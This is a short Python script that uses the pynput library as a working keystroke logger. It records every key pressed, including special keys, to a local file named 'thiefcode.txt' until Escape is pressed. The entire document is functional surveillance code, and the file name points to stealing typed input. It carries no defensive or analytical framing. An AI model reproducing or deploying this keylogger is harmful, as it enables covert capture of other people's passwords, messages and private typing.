from pynput.keyboard import Key, Listener

# File to store logs
log_file = "thiefcode.txt"

# Function to log each key pressed
def on_press(key):
    # Write the pressed key to a log file
    with open(log_file, "a") as f:
        try:
            f.write(f'{key.char}')  # For regular keys
        except AttributeError:
            if key == Key.space:
                f.write(' ')  # To log space as a space character
            elif key == Key.enter:
                f.write('\n')  # To log Enter as a new line
            else:
                f.write(f'[{key}]')  # For special keys like Shift, Ctrl, etc.

# Function to handle key release (optional)
def on_release(key):
    if key == Key.esc:
        # Stop listener if the escape key is pressed
        return False

# Setup the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
